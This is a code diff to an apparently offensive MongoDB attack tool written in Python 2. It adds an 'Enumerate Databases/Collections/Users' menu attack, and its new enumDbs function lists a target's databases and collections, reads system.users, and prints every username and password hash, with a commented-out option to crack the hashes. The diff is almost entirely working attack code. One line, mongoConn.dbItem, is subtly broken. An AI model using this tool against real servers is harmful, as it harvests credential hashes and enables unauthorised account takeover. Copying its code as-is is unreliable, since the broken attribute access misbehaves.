@@ -35,14 +35,17 @@ def netAttacks(target, dbPort, myIP, myPort):
         while mgtSelect:
             print "\n"
             print "1-Get Server Version and Platform"
-            print "2-Clone a Database"
-            print "3-Return to Main Menu"
+            print "2-Enumerate Databases/Collections/Users"
+            print "3-Clone a Database"
+            print "4-Return to Main Menu"
             attack = raw_input("Select an attack: ")
 
             if attack == '1':
                 print "\n"
                 getPlatInfo(conn)
             if attack == '2':
+                enumDbs(conn)
+            if attack == '3':
                 print "\n"
                 if myIP == "NOT SET":
                     print "Target database not set"
@@ -51,7 +54,7 @@ def netAttacks(target, dbPort, myIP, myPort):
 
 
 
-            elif attack == '3':
+            elif attack == '4':
                 return
 
 
@@ -134,3 +137,44 @@ def mongoScan(ip,port):
                 return[2,None]
     except:
         return [3,None]
+def enumDbs (mongoConn):
+    try:
+        print "List of databases:"
+        print "\n".join(mongoConn.database_names())
+        print "\n"
+
+    except:
+        print "Error:  Couldn't list databases.  The provided credentials may not have rights."
+
+    print "List of collections:"
+
+    try:
+        for dbItem in mongoConn.database_names():
+            db = mongoConn.dbItem
+            print dbItem + ":"
+#            print db.users
+#            print str(db.collection_names(True))
+#            for index in db.collection_names():
+#                print db[index]
+            print "\n".join(db.collection_names())
+            print "\n"
+
+            if 'system.users' in db.collection_names():
+                users = list(db.system.users.find())
+                print "Database Users and Password Hashes:"
+
+                for x in range(0, len(users)):
+                    print "Username: " + users[x]['user']
+                    print "Hash: " + users[x]['pwd']
+                    print "\n"
+#                    crack = raw_input("Crack this hash (y/n)? ")
+
+#                    if crack in yes_tag:
+#                        passCrack(users[x]['user'], users[x]['pwd'])
+
+    except Exception, e:
+        print e
+        print "Error:  Couldn't list collections.  The provided credentials may not have rights."
+
+    print "\n"
+    return
